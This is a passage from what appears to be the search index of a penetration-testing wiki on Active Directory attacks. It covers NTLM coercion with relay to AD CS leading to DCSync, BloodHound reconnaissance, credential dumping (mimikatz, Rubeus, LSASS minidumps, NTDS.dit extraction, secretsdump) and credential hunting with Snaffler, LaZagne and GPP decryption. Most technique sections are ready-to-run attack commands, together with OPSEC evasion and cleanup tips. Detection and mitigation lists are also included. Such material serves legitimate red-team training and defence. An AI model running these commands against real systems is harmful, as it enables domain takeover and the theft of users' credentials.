M=pe\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#exploitation-with-ntlm-relay-to-ad-cs","title":"Exploitation with NTLM Relay to AD CS","text":"<ol> <li> <p>Start ntlmrelayx to relay authentication to AD CS: <pre><code>sudo ntlmrelayx.py -debug -smb2support --target http://CA01.domain.local/certsrv/certfnsh.asp --adcs --template DomainController\n</code></pre></p> </li> <li> <p>Coerce authentication from the domain controller: <pre><code>python3 PetitPotam.py &lt;attackerIP&gt; &lt;DCIP&gt;\n</code></pre></p> </li> </ol> <p>Or using NetExec: <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o LISTENER=&lt;AttackerIP&gt; M=pe\n</code></pre></p> <ol> <li> <p>If successful, ntlmrelayx will output a base64 encoded certificate.</p> </li> <li> <p>Use the certificate to request a Kerberos TGT for the domain controller: <pre><code>python3 gettgtpkinit.py DOMAIN.LOCAL/DC01\\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache\n</code></pre></p> </li> <li> <p>Set the Kerberos environment variable: <pre><code>export KRB5CCNAME=dc01.ccache\n</code></pre></p> </li> <li> <p>Perform DCSync to extract credentials: <pre><code>impacket-secretsdump -just-dc-user DOMAIN/administrator -k -no-pass \"DC01$\"@DC01.DOMAIN.LOCAL\n</code></pre></p> </li> </ol>","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#other-coercion-methods","title":"Other Coercion Methods","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#printerbug-ms-rprn","title":"PrinterBug (MS-RPRN)","text":"<p>Exploits the Print System Remote Protocol: <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o METHOD=PrinterBug\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#shadowcoerce-ms-fsrvp","title":"ShadowCoerce (MS-FSRVP)","text":"<p>Exploits the File Server Remote VSS Protocol: <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o METHOD=ShadowCoerce\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#webclient-service-coercion","title":"WebClient Service Coercion","text":"<p>Exploits the WebClient service to force a connection: <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o METHOD=WebClient\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#detection","title":"Detection","text":"<ul> <li>Monitor for unexpected authentication attempts from servers and domain controllers</li> <li>Look for Event ID 4624 (logon) and 4625 (failed logon) events from critical servers to unusual destinations</li> <li>Watch for RPC calls to suspicious or unusual endpoints</li> <li>Monitor for exploitation of specific protocol methods associated with coercion attacks</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#mitigation","title":"Mitigation","text":"<ul> <li>Apply Microsoft's security updates that address specific coercion vulnerabilities</li> <li>Enable Extended Protection for Authentication (EPA) and channel binding</li> <li>Enforce SMB signing across the environment, especially on domain controllers</li> <li>Block or restrict access to vulnerable RPC endpoints</li> <li>Disable NTLM authentication where possible in favor of Kerberos</li> <li>For AD CS relay attacks:</li> <li>Configure certificate templates to require stronger authentication</li> <li>Enable HTTPS on Certificate Authority Web Enrollment</li> <li>Implement network segmentation to isolate critical servers</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/bloodhound/","title":"Bloodhound","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#technique","title":"Technique","text":"<p>BloodHound is a powerful Active Directory reconnaissance tool that uses graph theory to reveal hidden and often unintended relationships within an Active Directory environment. It collects data about users, computers, groups, access control lists, sessions, and trusts through LDAP queries and other methods, then presents this information visually in a graph database.</p> <p>The tool can discover non-obvious attack paths that might otherwise go unnoticed during manual enumeration. These paths often lead to privilege escalation opportunities, including paths to Domain Admin or other highly privileged groups. BloodHound allows attackers to quickly identify the most efficient path to their target, reducing the risk of detection by minimizing unnecessary actions.</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#prerequisites","title":"Prerequisites","text":"<p>Access Level: A valid Active Directory domain account, typically with standard user privileges. No special or elevated privileges are required for basic collection.</p> <p>System State:  - Windows Collection: Access to a domain-joined Windows machine for SharpHound collection - Linux Collection: Network connectivity to Domain Controllers from a Linux machine</p> <p>Environment Requirements: - Neo4j database (for data storage and visualization) - BloodHound GUI application (for data analysis) - SharpHound or BloodHound Python (for data collection)</p> <pre><code>wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz\n\ntar -xvzf bloodhound-cli-linux-amd64.tar.gz\n\n./bloodhound-cli install\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#considerations","title":"Considerations","text":"<p>Impact</p> <p>BloodHound provides a comprehensive map of the Active Directory environment, revealing paths to privileged access that might otherwise remain hidden. This can significantly accelerate privilege escalation and lateral movement operations.</p> <p>OPSEC</p> <ul> <li> <p>Collection Noise: SharpHound performs numerous LDAP, SMB, and WMI queries which may trigger detection systems. These queries might appear suspicious, especially if many are made in a short period.</p> </li> <li> <p>File Creation: SharpHound creates multiple JSON files that could be detected by endpoint protection.</p> </li> <li> <p>LDAP Traffic: Remote collection using BloodHound Python generates significant LDAP traffic to domain controllers, which may appear in security logs.</p> </li> <li> <p>Session Enumeration: Collecting session data requires touching each computer in the domain, which can generate alerts.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#collection-from-linux","title":"Collection (from Linux)","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#bloodhound-python","title":"BloodHound Python","text":"<p>Collect all data: <pre><code>bloodhound-python -c All -u 'username' -p 'password' -d domain.local -ns 10.10.10.10\n</code></pre></p> <p>Collect specific data: <pre><code>bloodhound-python -c Domain,LocalAdmin -u 'username' -p 'password' -d domain.local -ns 10.10.10.10\n</code></pre></p> <p>Use LDAPS: <pre><code>bloodhound-python -c All -u 'username' -p 'password' -d domain.local -ns 10.10.10.10 --use-ldaps\n</code></pre></p>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#netexec","title":"NetExec","text":"<pre><code>nxc ldap 10.10.10.10 -u 'username' -p 'password' --bloodhound --collection All --dns-server 10.10.10.10\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#collection-from-windows","title":"Collection (from Windows)","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#sharphound-c-binary","title":"SharpHound (C# Binary)","text":"<p>Full collection: <pre><code>SharpHound.exe --CollectionMethods All\n</code></pre></p> <p>Stealth collection: <pre><code>SharpHound.exe --CollectionMethods DCOnly --Stealth\n</code></pre></p> <p>Specific collection with output: <pre><code>SharpHound.exe --CollectionMethods Session,Trusts --OutputDirectory C:\\Temp\n</code></pre></p>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#powershell-module","title":"PowerShell Module","text":"<p>Import and run: <pre><code>Import-Module .\\SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All\n</code></pre></p> <p>Stealth collection: <pre><code>Invoke-BloodHound -CollectionMethod DCOnly -Stealth\n</code></pre></p>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#bloodhound-data-analysis","title":"BloodHound Data Analysis","text":"<p>https://queries.specterops.io/</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#common-cypher-queries","title":"Common Cypher Queries","text":"<p>Find all Domain Admins: <pre><code>MATCH (n:Group) WHERE n.name =~ \".*DOMAIN ADMINS.*\" RETURN n\n</code></pre></p> <p>Find paths to Domain Admins: <pre><code>MATCH p=shortestPath((u:User {owned:true})-[*1..]-&gt;(g:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"})) RETURN p\n</code></pre></p> <p>Find Kerberoastable users: <pre><code>MATCH (u:User {hasspn:true}) RETURN u\n</code></pre></p> <p>Find high-value targets: <pre><code>MATCH (u:User) WHERE u.highvalue=true RETURN u\n</code></pre></p> <p>Find computers where Domain Admins are logged in: <pre><code>MATCH p=(u:User)-[:MemberOf*1..]-&gt;(g:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"}), (c:Computer)-[:HasSession]-&gt;(u) RETURN c.name, u.name\n</code></pre></p> <p>Find PS Remoting paths: <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) \nMATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) \nRETURN p2\n</code></pre></p> <p>Find SQL Admin paths: <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) \nMATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) \nRETURN p2\n</code></pre></p>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#collection-methods-explained","title":"Collection Methods Explained","text":"<ul> <li>Default: Basic data collection (Container, Group, LocalGroup, GPOLocalGroup, Session, Trusts)</li> <li>All: All collection methods except RDP, DCOM, and LocalAdmin</li> <li>DCOnly: Collects data only from Domain Controllers (reduced footprint)</li> <li>ObjectProps: Object properties (description, email, title, etc.)</li> <li>ACL: Permission relationships between objects</li> <li>Group: Group membership information</li> <li>LocalAdmin: Finds local administrator information</li> <li>Session: User session information</li> <li>Trusts: Domain and forest trust relationships</li> <li>Container: Organizational Units and containers</li> <li>GPOLocalGroup: Local group memberships through GPOs</li> <li>LoggedOn: Currently logged-on users (requires admin)</li> <li>ComputerOnly: Just computer objects</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>Delete SharpHound JSON files after importing</li> <li>Clear SharpHound logs (located in the output directory)</li> <li>Remove any SharpHound binaries or PowerShell modules</li> <li>Avoid leaving the Neo4j database accessible to unauthorized users</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#detection","title":"Detection","text":"<ul> <li>Monitor for SharpHound-specific files (group_membership.json, local_admins.json, etc.)</li> <li>Watch for numerous LDAP queries in a short timeframe, especially those querying for all objects</li> <li>Look for automated collection of computer account information</li> <li>Monitor for suspicious binaries or PowerShell imports (SharpHound.ps1, SharpHound.exe)</li> <li>Event ID 4662 (operation performed on AD object) with unusual query patterns</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/bloodhound/#mitigation","title":"Mitigation","text":"<ul> <li>Network Segmentation: Implement proper tiered administration models</li> <li>Just-In-Time Administration: Use temporary privileges instead of permanent ones</li> <li>Remove Excessive Privileges: Regularly audit and remove unnecessary access rights</li> <li>Protected Users Security Group: Place sensitive accounts in this group to limit credential exposure</li> <li>Regular BloodHound Audits: Run BloodHound proactively to identify and mitigate attack paths</li> <li>Monitor Service Accounts: Ensure service accounts don't have excessive privileges</li> <li>Implement PAWs: Use Privileged Access Workstations for administrative tasks</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1059","#stage/reconnaissance","#stage/discovery","#os/windows","#os/linux","#tool/bloodhound","#tool/sharphound","#tool/bloodhound-python","#tool/nxc"]},{"location":"Active%20Directory/flat/credential_dumping/","title":"Credential dumping","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#technique","title":"Technique","text":"<p>Credential Dumping involves extracting credential material from various sources on a Windows system, including:</p> <ol> <li> <p>LSASS Memory: The Local Security Authority Subsystem Service (LSASS) process stores credentials in memory, including plaintext passwords, NTLM hashes, and Kerberos tickets.</p> </li> <li> <p>SAM Database: The Security Account Manager (SAM) database stores local user account credentials.</p> </li> <li> <p>NTDS.dit: The Active Directory database file containing domain user credentials.</p> </li> <li> <p>Kerberos Tickets: Authentication tickets cached in memory or on disk.</p> </li> </ol> <p>These extracted credentials can be used for lateral movement, privilege escalation, and persistence in an environment.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#prerequisites","title":"Prerequisites","text":"<p>Access Level:  - For local credential dumping: Local administrator privileges on the target system - For domain credential dumping (NTDS.dit): Domain Administrator privileges or local administrator access to a Domain Controller</p> <p>System State: Target system must be accessible and the relevant services must be running.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#local-credential-dumping","title":"Local Credential Dumping","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#using-mimikatz","title":"Using Mimikatz","text":"<p>Dump credentials from LSASS memory: <pre><code>.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n</code></pre></p> <p>Output to file: <pre><code>.\\mimikatz.exe \"log C:\\path\\to\\mimikatz.log\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"log\" \"exit\"\n</code></pre> or <pre><code>.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit &gt; C:\\path\\to\\mimi-output.txt\n</code></pre></p> <p>Dump SAM database (local credentials): <pre><code>.\\mimikatz.exe \"privilege::debug\" \"lsadump::sam /patchlsadsu\" exit\n</code></pre></p> <p>Dump LSA secrets (on a Domain Controller): <pre><code>.\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" exit\n</code></pre></p> <p>Target krbtgt account (for golden ticket creation): <pre><code>.\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /inject /name:krbtgt\" exit\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#using-rubeus-for-kerberos-tickets","title":"Using Rubeus for Kerberos Tickets","text":"<p>List cached tickets: <pre><code># Non-elevated: Lists current user's tickets\n# Elevated: Lists everyone's tickets\nRubeus.exe triage\n</code></pre></p> <p>Specify a service to filter tickets: <pre><code>Rubeus.exe triage /service:ldap\n</code></pre></p> <p>Dump tickets: <pre><code># Non-elevated: Dumps current user's tickets\nRubeus.exe dump\n\n# Elevated: Dumps all tickets by targeting krbtgt\nRubeus.exe dump /service:krbtgt\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#alternative-methods","title":"Alternative Methods","text":"<p>Save registry hives and extract locally: <pre><code>reg.exe save hklm\\sam C:\\sam.save\nreg.exe save hklm\\system C:\\system.save\nreg.exe save hklm\\security C:\\security.save\n</code></pre></p> <p>Then extract credentials using Impacket: <pre><code>impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL\n</code></pre></p> <p>Dump LSASS with Task Manager: 1. Open Task Manager 2. Select the Processes tab 3. Find &amp; right-click the Local Security Authority Process 4. Select \"Create dump file\"</p> <p>The dump file will be saved to: <pre><code>C:\\Users\\&lt;username&gt;\\AppData\\Local\\Temp\\lsass.DMP\n</code></pre></p> <p>Rundll32.exe &amp; Comsvcs.dll Method:</p> <p>Get LSASS PID: <pre><code>tasklist /svc\n</code></pre> or <pre><code>Get-Process lsass\n</code></pre></p> <p>Create dump file with rundll32: <pre><code>rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full\n</code></pre></p> <p>Extract credentials with Pypykatz: <pre><code>pypykatz lsa minidump lsass.dmp\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#ntdsdit-dumping","title":"NTDS.dit Dumping","text":"<p>Using Volume Shadow Copy: <pre><code>vssadmin CREATE SHADOW /For=C:\n</code></pre></p> <p>Copying NTDS.dit from the shadow copy: <pre><code>cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit\n</code></pre></p> <p>Extract credentials with Impacket: <pre><code>impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#remote-credential-dumping","title":"Remote Credential Dumping","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#using-netexec","title":"Using NetExec","text":"<p>Dump LSA secrets: <pre><code>nxc smb 10.129.42.198 -u 'username' -p 'password' --local-auth --lsa\n</code></pre></p> <p>Dump SAM database: <pre><code>nxc smb 10.129.42.198 -u 'username' -p 'password' --local-auth --sam\n</code></pre></p> <p>Dump NTDS.dit: <pre><code>nxc smb 10.129.201.57 -u 'username' -p 'password' --ntds\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#using-impacket","title":"Using Impacket","text":"<p>Dump everything remotely: <pre><code>impacket-secretsdump 'domain.local'/'username':'password'@'IP' -dc-ip &lt;DCIP&gt;\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#detection","title":"Detection","text":"<ul> <li>Monitor for process access to LSASS (Event ID 4656, 4663)</li> <li>Watch for creation of memory dump files</li> <li>Monitor for suspicious use of rundll32.exe with comsvcs.dll</li> <li>Look for Mimikatz-like activity (memory pattern matching)</li> <li>Monitor for registry save operations on SAM, SYSTEM, SECURITY hives</li> <li>Watch for Volume Shadow Copy creation on Domain Controllers</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/credential_dumping/#mitigation","title":"Mitigation","text":"<ul> <li>Implement credential guard to protect LSASS memory</li> <li>Use Protected Process Light (PPL) for LSASS</li> <li>Restrict local administrator access</li> <li>Implement Just-In-Time (JIT) administration for privileged access</li> <li>Configure Windows Defender Credential Guard (for compatible systems)</li> <li>Implement Attack Surface Reduction (ASR) rules</li> <li>Ensure proper patch management</li> <li>Use strong passwords that resist offline cracking</li> <li>Implement network segmentation to limit lateral movement capabilities</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1003","#stage/credential-access","#os/windows","#tool/mimikatz","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/pypykatz"]},{"location":"Active%20Directory/flat/data_pillaging/","title":"Data Pillaging &amp; Credential Hunting","text":"","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#introduction","title":"Introduction","text":"<p>Data pillaging focuses on locating, retrieving, and extracting credentials (passwords, hashes, tokens, keys) and sensitive data from accessible sources on compromised hosts, networks, or cloud environments. This excludes credential dumping techniques that require code execution, such as memory scraping or SAM hive extraction. Instead, it emphasizes searching files, configurations, databases, and shares for sensitive data.</p>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#automated-tools","title":"Automated Tools","text":"","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#snaffler","title":"Snaffler","text":"<p>A powerful tool for identifying and capturing credentials and sensitive data from network shares.</p> <pre><code># Basic execution - spiders all shares in a domain\nSnaffler.exe -s -d domain.local -o snaffler.log -v data\n\n# Target specific computer with domain credentials\nSnaffler.exe -s -n targetcomputer.domain.local -d domain.local -u username -p password -o results.log\n\n# Run from a domain-joined computer without credentials\nSnaffler.exe -s -o results.log\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#lazagne","title":"LaZagne","text":"<p>Retrieves passwords stored in commonly used software.</p> <pre><code># Run all modules\nlaZagne.exe all\n\n# Save output to a specific location\nlaZagne.exe all -output C:\\Windows\\Tasks\n\n# Decrypt domain credentials (requires current user's password)\nlaZagne.exe all -password &lt;CURRENT_USER_PASSWORD&gt;\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#seatbelt","title":"Seatbelt","text":"<p>Performs security-oriented host surveys that can uncover credentials.</p> <pre><code># Run all checks\nSeatbelt.exe -group=all -outputfile=\"C:\\Windows\\Tasks\\all.txt\"\n\n# Run credential-specific checks\nSeatbelt.exe -group=user -outputfile=\"C:\\Windows\\Tasks\\creds.txt\"\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#defaultcreds-cheat-sheet","title":"DefaultCreds-Cheat-Sheet","text":"<p>CLI tool with database of default credentials for various applications:</p> <pre><code># Install\npip3 install defaultcreds-cheat-sheet --break-system-packages\n\n# Search for default credentials\ncreds search tomcat\ncreds search jenkins\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#windows-credential-hunting","title":"Windows Credential Hunting","text":"","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#file-system-searches","title":"File System Searches","text":"<pre><code># Search for credentials in common file types\nfindstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n\n# Search recursively through specific directories\nfindstr /S /I /M \"password\" C:\\Users\\*\\Documents\\*.txt C:\\inetpub\\*.config\n\n# Search for connection strings in web configs\nfindstr /S /I /M \"connectionString\" C:\\inetpub\\*.config\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#group-policy-preferences-gpp-passwords","title":"Group Policy Preferences (GPP) Passwords","text":"<p>GPP passwords are stored in XML files in the SYSVOL share.</p> <pre><code># Using Impacket without credentials\nimpacket-Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'\n\n# With credentials\nimpacket-Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'\n\n# Using NetExec\nnxc smb 172.16.5.5 -u 'user' -p 'pass' -M gpp_autologin\n\n# Decrypt discovered cpassword\ngpp-decrypt \"&lt;cpassword_value&gt;\"\n</code></pre>","tags":["type/technique","tactic/credential-access","tactic/collection","technique/data-pillaging","technique/credential-hunting","tool/snaffler","tool/lazagne","tool/seatbelt","tool/grep","tool/findstr"]},{"location":"Active%20Directory/flat/data_pillaging/#passwords-in-ad-description-fields","title":"Passwords in AD Description Fields","text":"<pre><code># Using PowerView\nImport-Module PowerView.ps1\nGet-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne 